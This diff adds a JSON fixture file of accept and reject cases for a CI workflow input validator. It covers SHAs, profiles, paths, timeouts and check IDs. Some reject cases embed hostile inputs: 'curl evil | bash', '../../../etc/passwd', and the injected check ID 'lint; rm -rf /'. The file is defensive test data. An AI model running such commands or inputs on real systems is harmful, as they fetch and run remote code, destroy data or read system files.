@@ -1,0 +1,254 @@
+{
+  "_comment": "typed 输入契约正反 fixtures；每个用例经 coerce_workflow_inputs（同时覆盖字符串/typed 两种传入）。",
+  "cases": [
+    {
+      "name": "valid_typed",
+      "expect": "ok",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "concurrency": 2,
+        "timeout_minutes": 20,
+        "event": {"name": "pull_request", "base_ref": "main"},
+        "changed_files": ["framework/app.cpp"],
+        "required_checks": ["lint", "unit"],
+        "optional_checks": ["heavy", "perf"],
+        "classifier_status": "ok"
+      }
+    },
+    {
+      "name": "valid_coerced_strings",
+      "expect": "ok",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "concurrency": "2",
+        "timeout_minutes": "20",
+        "event": {"name": "push", "head_ref": "main"},
+        "changed_files_json": "[\"docs/ci/api.md\"]",
+        "required_checks_json": "[\"lint\"]",
+        "optional_checks_json": "[\"heavy\"]",
+        "classifier_status": "ok"
+      }
+    },
+    {
+      "name": "short_sha",
+      "expect": "reject",
+      "code": "E_INPUT_SHA",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb",
+        "profile": "hosted"
+      }
+    },
+    {
+      "name": "empty_sha",
+      "expect": "reject",
+      "code": "E_INPUT_SHA",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "",
+        "profile": "hosted"
+      }
+    },
+    {
+      "name": "unknown_field_runs_on",
+      "expect": "reject",
+      "code": "E_INPUT_UNKNOWN_FIELD",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "runs_on": "self-hosted"
+      }
+    },
+    {
+      "name": "unknown_field_arbitrary_command",
+      "expect": "reject",
+      "code": "E_INPUT_UNKNOWN_FIELD",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "run": "curl evil | bash"
+      }
+    },
+    {
+      "name": "path_escape_dotdot",
+      "expect": "reject",
+      "code": "E_INPUT_PATH",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "changed_files": ["../../../etc/passwd"]
+      }
+    },
+    {
+      "name": "path_absolute",
+      "expect": "reject",
+      "code": "E_INPUT_PATH",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "changed_files": ["/etc/passwd"]
+      }
+    },
+    {
+      "name": "path_backslash",
+      "expect": "reject",
+      "code": "E_INPUT_PATH",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "changed_files": ["framework\\app.cpp"]
+      }
+    },
+    {
+      "name": "negative_concurrency",
+      "expect": "reject",
+      "code": "E_INPUT_CONCURRENCY",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "concurrency": -1
+      }
+    },
+    {
+      "name": "zero_timeout",
+      "expect": "reject",
+      "code": "E_INPUT_TIMEOUT",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "timeout_minutes": 0
+      }
+    },
+    {
+      "name": "timeout_overflow",
+      "expect": "reject",
+      "code": "E_INPUT_TIMEOUT",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "timeout_minutes": 100000
+      }
+    },
+    {
+      "name": "secret_canary_in_path",
+      "expect": "reject",
+      "code": "E_INPUT_SECRET",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "changed_files": ["secrets/ghp_0000000000000000000000000000000000.txt"]
+      }
+    },
+    {
+      "name": "self_hosted_profile",
+      "expect": "reject",
+      "code": "E_PROFILE_NO_ADMISSION",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "self-hosted"
+      }
+    },
+    {
+      "name": "unknown_profile",
+      "expect": "reject",
+      "code": "E_INPUT_PROFILE",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "windows-latest"
+      }
+    },
+    {
+      "name": "bad_event_name",
+      "expect": "reject",
+      "code": "E_INPUT_EVENT",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "event": {"name": "deployment"}
+      }
+    },
+    {
+      "name": "bad_classifier_status",
+      "expect": "reject",
+      "code": "E_INPUT_STATUS",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "classifier_status": "maybe"
+      }
+    },
+    {
+      "name": "unsafe_check_id",
+      "expect": "reject",
+      "code": "E_INPUT_CHECK_ID",
+      "payload": {
+        "repo": "yqm-307/bbt-framework",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted",
+        "required_checks": ["lint; rm -rf /"]
+      }
+    },
+    {
+      "name": "repo_dotdot_leading_segment",
+      "expect": "reject",
+      "code": "E_INPUT_REPO",
+      "payload": {
+        "repo": "../x",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted"
+      }
+    },
+    {
+      "name": "repo_dotdot_trailing_segment",
+      "expect": "reject",
+      "code": "E_INPUT_REPO",
+      "payload": {
+        "repo": "a/..",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted"
+      }
+    },
+    {
+      "name": "repo_single_dot_segment",
+      "expect": "reject",
+      "code": "E_INPUT_REPO",
+      "payload": {
+        "repo": "a/.",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted"
+      }
+    },
+    {
+      "name": "repo_edge_allowed_chars",
+      "expect": "ok",
+      "payload": {
+        "repo": "yqm-307/bbt.framework-x",
+        "source_sha": "a60edfb4f7cd77e69926be475e2c45e324a3db2b",
+        "profile": "hosted"
+      }
+    },
+    {
+      "name": "not_object",
+      "expect": "reject",
+      "code": "E_INPUT_TYPE",
+      "payload": ["not", "an", "object"]
+    }
+  ]
+}
